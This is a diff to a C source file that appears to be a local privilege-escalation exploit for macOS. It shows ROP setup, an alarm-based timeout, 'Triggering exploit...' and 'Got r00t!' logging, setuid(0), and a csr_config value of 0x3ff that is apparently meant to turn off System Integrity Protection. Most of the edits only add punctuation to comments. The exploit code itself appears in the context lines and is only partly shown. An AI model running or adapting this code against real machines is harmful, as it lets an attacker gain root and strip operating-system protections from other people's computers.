@@ -427,8 +427,7 @@ int main(int argc, const char **argv)
     }
 
     // When our rewritten object is used it will spin, so we set an alarm to detect this.
-
-    // First create a separate thread to handle the signal
+    // First create a separate thread to handle the signal.
     timeout_args_t timeout_args =
     {
         .rop = &rop,
@@ -444,7 +443,7 @@ int main(int argc, const char **argv)
         return KERN_FAILURE;
     }
 
-    // Then mask our thread against the alarm
+    // Then mask our thread against the alarm.
     sigset_t sigset, oldsigset;
     r = sigemptyset(&sigset);
     if(r != 0)
@@ -465,7 +464,7 @@ int main(int argc, const char **argv)
         goto out3;
     }
 
-    // And set up the timer
+    // And set up the timer.
     ualarm(EXPLOIT_TIMEOUT, 0);
 
     LOG("Triggering exploit...");
@@ -511,7 +510,7 @@ int main(int argc, const char **argv)
         LOG("Got r00t!");
     }
 
-    // Update itk_host to realhost
+    // Update itk_host type to host_priv
     if(setuid(0) != 0)
     {
         ERR("Failed to setuid(0) (the hell, I thought we were root?)");
@@ -679,7 +678,7 @@ do \
             goto out5;
         }
 
-        const uint32_t csr_config = 0x1ff;
+        const uint32_t csr_config = 0x3ff;
         CFDataRef csr_data = CFDataCreateWithBytesNoCopy(NULL, (uint8_t*)&csr_config, sizeof(csr_config), kCFAllocatorNull);
         if(csr_data == NULL)
         {
